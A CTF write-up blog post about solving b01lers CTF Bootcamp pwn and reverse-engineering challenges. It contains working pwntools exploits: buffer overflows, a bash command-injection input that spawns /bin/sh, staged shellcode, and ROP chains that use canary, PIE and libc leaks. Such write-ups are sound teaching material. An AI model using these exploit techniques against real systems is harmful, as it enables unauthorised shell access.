---           
layout: post
title:  "b01lers CTF bootcamp"
date:   2020-10-05
categories: ctf
description: Writeup b01lers CTF bootcamp 
tags: ctf-writeup              
---

<img src="/images/b01lersCTFbootcamp/scoreboard.png"/>

My university team CCUG got 11 places at "b01lers CTF Bootcamp", in this post I will explain some challenge
that I solve during the competition.

## Pwn
<ul style="line-height: 10px;">
    <li> <a href="#Metacortex">Pwn - Metacortex</a> </li>
    <li> <a href="#ThereisnoSpoon">Pwn - There is no Spoon </a> </li>
    <li> <a href="#TheOracle">Pwn - The Oracle</a> </li>
    <li> <a href="#WhiteRabbit">Pwn - White Rabbit</a> </li>
    <li> <a href="#FreeYourMind">Pwn - Free Your Mind </a> </li>
    <li> <a href="#SeeforYourself">Pwn - See for Yourself </a> </li>
    <li> <a href="#GoodbyeMrAnderson">Pwn - Goodbye, Mr. Anderson </a> </li>
</ul>

## Rev
<ul style="line-height: 10px;">
    <li> <a href="#LinkBattle">Rev - Link Battle </a> </li>
    <li> <a href="#ThumbThumb">Rev - Thumb Thumb </a> </li>
</ul>

<h1 id="Metacortex">Metacortex</h1>

### Description:

    This company is one of the top software companies in the world, 
    because every single employee knows that they are part of a whole. 
    Thus, if an employee has a problem, the company has a problem.
    nc chal.ctf.b01lers.com 1014

### Solution:

this is a simple buffer overflow challenge, we need to pass the if condition, we have to set 
%rax and %rbx to 0x0.
{% highlight python %}
from pwn import *
#r = process("./metacortex-72ec7dee20d0b191fe14dc2480bd3f43")
r = remote("chal.ctf.b01lers.com", 1014)
p = "\x00" * 104
r.sendline(p)
r.interactive()
{% endhighlight %}

FLAG: flag{Ne0_y0uAre_d0ing_well}

<h1 id="ThereisnoSpoon">There is no Spoon </h1>

### Description:

    Neo: bend reality, and understand the truth of the matrix.
    nc chal.ctf.b01lers.com 1006

### Solution:

another easy challenge, in this challenge we have to overwrite variable `changeme`

{% highlight python %}
from pwn import *
#r = process("thereisnospoon-3b08fb627c71c8c2149d1e57d98a1934")
r = remote("chal.ctf.b01lers.com", 1006)
r.sendline("\x00"*900)
r.sendline("90000000000000")
r.interactive()
{% endhighlight %}

FLAG: flag{l0tz_0f_confUsi0n_vulnz}

<h1 id="TheOracle">The Oracle</h1>

### Description:
    Would you still have broken it if I hadn't said anything?
    nc chal.ctf.b01lers.com 1015

### Solution:

I am the third person to solve this challenge, another buffer overflow challenge.
in this challenge, we have to overwrite %rip to `0x401196`

{% highlight python %}
#r = process("theoracle-ef25f23d8a2218004732f71bfbfa1267")
r = remote("chal.ctf.b01lers.com", 1015)
p = "A" * 24
p += p64(0x401196)
r.sendline(p)
r.interactive()
{% endhighlight %}

FLAG: flag{Be1ng_th3_1_is_JusT_l1ke_b3ing_in_l0v3}

<h1 id="WhiteRabbit">White Rabbit</h1>

### Description:

    Follow the white rabbit...
    nc chal.ctf.b01lers.com 1013

### Solution:

in this challenge, we can't set "flag" as our input 


<img src="/images/b01lersCTFbootcamp/whiterabbit.png"/>

but we can inject a bash command to get a shell

{% highlight python %}

from pwn import *
r = remote("chal.ctf.b01lers.com",1013)
x = ''' ']||/bin/sh;[' '''
r.sendline(x)
r.interactive()

{% endhighlight %}

FLAG: flag{Th3_BuNNy_wabbit_l3d_y0u_h3r3_4_a_reason}

<h1 id="FreeYourMind">Free Your Mind</h1>

### Description:

Next up, hack the matrix again, but this time, insert your own code.
nc chal.ctf.b01lers.com 1007

### Solution:

challenge source code:



{% highlight C %}
#include <stdio.h>
#include <unistd.h>

char shellcode[16];

int main() {
    char binsh[8] = "/bin/sh";

    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    printf("I'm trying to free your mind, Neo. But I can only show you the door. You're the one that has to walk through it.\n");
    read(0, shellcode, 16);

    ((void (*)()) (shellcode))();
}
    
{% endhighlight %}



this is a shellcode challenge I am the second person to solve this challenge, 
we can only write 16byte shellcode to the `.bss`. in order to send our full shellcode we can 
write a shellcode that can read from stdin and after that we send our shellcode to the last part of shellcode 

{% highlight python %}
from pwn import * 
#r = process("./shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d")
r = remote("chal.ctf.b01lers.com", 1007)
binsh = 0x4011b3
shellcode = ''' mov rsi, 0x40409e
                mov edx, 100
                syscall
'''
r.sendline(asm(shellcode))
r.sendline(asm(shellcraft.sh()))
r.interactive()
{% endhighlight %}

FLAG: flag{cust0m_sh3llc0d1ng_c4n_b33_c00l}

<h1 id="SeeforYourself">See for Yourself</h1>

### Description:

    The matrix requires a more advanced trick this time. Hack it.
    nc chal.ctf.b01lers.com 1008

### Solution:

I am the second person to solve this challenge, we can create a rop to set the address of "/bin/sh" to `%rdi` and call system from plt 

{% highlight python %}
from pwn import *
r = process("./simplerop-af22071fcb7a6df9175940946a6d45e5")
r = remote("chal.ctf.b01lers.com", 1008)
binsh = 0x402008
sy = 0x000000000401080
pprdi = 0x0000000000401273
ret = 0x000000000040101a
p = "A" * 8 
p += p64(ret)
p += p64(pprdi)
p += p64(binsh)
p += p64(sy)
r.sendline(p)
r.interactive()
{% endhighlight %}

FLAG: flag{ROP_ROOP_OOP_OOPS}

<h1 id="GoodbyeMrAnderson">Goodbye, Mr. Anderson </h1>

### Description:

    Do it again Neo. Cheat death.
    nc chal.ctf.b01lers.com 1009

### Solution:

this is the tricky one, we can overwrite `__libc_start_main` using `leak_stack_canary` function
the binary itself use full protection and use libc version 2.31. which we can't use one_gadget to solve this challenge.
in order to solve this challenge we need to leak canary, base pie and libc address 
since we can only overwrite `__libc_start_main` in order to create a rop we can use `add rsp, 8; ret;` gadget
to get our rop working properly. pardon my crappy code.

{% highlight python %}

#!/usr/bin/env python2

import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./leaks-c85e4a348b2a07ba8e6484d69956d968")
elf = ELF(TARGET)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def attach(r):
    if LOCAL:
        bkps = ["* main", "* main+229","* main+140"]
        gdb.attach(r, '\n'.join(["b %s"%(x,) for x in bkps]))
    return

def seto(size,val):
    r.sendline(size)
    r.sendline(val)

def exploit(r):
    pop_rdi = 0x0000000000026b72
    attach(r)

    r.recvuntil("Anderson.\n")
    seto("8","A"*17)
    r.sendline("A")
    r.recvuntil("AAAAAAA\n")
    leak = u64(r.recv(8).replace("\n","\x00").ljust(8, "\x00").replace("A","\x00"))
    base_pie = leak - elf.sym['_start']
    yay = base_pie + 0x00000000000011E9
    log.info("leak: " + hex(leak))
    log.info("base: " + hex(base_pie))
    log.info("yay : " + hex(yay))

    # leak canary
    r.sendline("24")
    r.sendline("A"* 24)
    r.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAA")
    canary = u64(r.recv(8).replace("\n","\x00").ljust(8,"\x00"))
    log.info("canary: " + hex(canary))
    

    # canary dah dapat sekarang balik ke main
    p = "A" * 24
    p += p64(canary)
    p += p64(99)
    p += p64(leak)
    r.sendline("50")
    r.sendline(p)
    r.sendline("X")


    r.sendline("16")
    r.sendline("A"* 16)
    r.sendline("40")
    r.sendline("A"*40)
    r.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    libc_start_main = u64(r.recv(8).replace("\n","\x00").ljust(8, "\x00")) - 64
    libc_base = libc_start_main - libc.sym['__libc_start_main']
    libc_system = libc_base + libc.sym['system']
    binsh = libc_base + libc.search("/bin/sh").next()
    log.info("libc_start_main: " + hex(libc_start_main))
    log.info("libc_base: " + hex(libc_base))
    log.info("system: " + hex(libc_system))

    r.sendline("56")
    r.sendline("A"*56)
    r.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    leak_stack = u64(r.recv(8).replace("\n","\x00").ljust(8, "\x00"))
    name = leak_stack 
    log.info("leak_stack: " + hex(leak_stack))


    pop_rdi = base_pie + 0x00000000000013f3
    pop_rax = base_pie + 0x00000000000011f1
    ret = base_pie + 0x000000000000101a
    jmp_rax = libc_base + 0x000000000000114f
    call_rsp = libc_base + 0x00000000000284c8
    add_rsp_8_ret = base_pie +  0x0000000000001016

    main = base_pie + elf.sym['main']

    p = "A" * 24
    p += p64(canary)
    p += p64(99)
    p += p64(add_rsp_8_ret ) 
    p += p64(pop_rdi)
    p += p64(pop_rdi)
    p += p64(binsh)
    p += p64(ret)
    p += p64(libc_system)
    p += p64(0xbeef)
    p += p64(0xdead)
    r.sendline("106")
    r.sendline(p)
    r.sendline("X")


    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("chal.ctf.b01lers.com", 1009)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
 

{% endhighlight %}

<h1 id="LinkBattle">Link Battle</h1>

### Description:

    Hmm....I hope you paid attention in class, spies!

### Solution:

since we were given a `.so` file, we can write a C code that load the `.so` file and call getflag function.

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

int main(int argc, char** argv)
{
    void *handle;
    void (*func_print_name)(const int*);

    handle = dlopen("./ok/libflaggen-f2c2f9306bdbae9522d200db5bd9f55d.so", RTLD_LAZY);
    if (!handle) {
    /* fail to load the library */
    fprintf(stderr, "Error: %s\n", dlerror());
    return EXIT_FAILURE;
    }

    *(void**)(&func_print_name) = dlsym(handle, "getflag");
    if (!func_print_name) {
    /* no such symbol */
    fprintf(stderr, "Error: %s\n", dlerror());
    dlclose(handle);
    return EXIT_FAILURE;
    }

    func_print_name(6666);
    dlclose(handle);

    return EXIT_SUCCESS;
}
{% endhighlight %}

compile `gcc sol.c -ldl` and run the binary

FLAG: flag{pl34s3_sp34k_3ngl1sh_m1n10n!_1v3_been_b4k1ng_und3r_th0s3_st00d1o_l1ghts!}

<h1 id="ThumbThumb">Thumb Thumb</h1>

### Description:


    Once upon a time, there was a young Thumb Thumb named Juni. Juni was shy and had no self confidence, 
    until one day evil Thumb Thumbs kidnapped his spy Thumb Thumb Parents.

    WANTED: EVIL THUMB THUMB. CRIME: KIDNAPPING. HAVE YOU SEEN THIS THUMB?

### Solution:

the flag is loaded from function thumblings_assemble, to dump the flag, 
use gdb to debug the binary and set a breakpoint at thumblings_assemble+230 after that examine the value of %rsp+16 using gdb


<img src="/images/b01lersCTFbootcamp/ThumbThumb.png"/>


FLAG: flag{s3nd_0ur_b3st_thumb5}
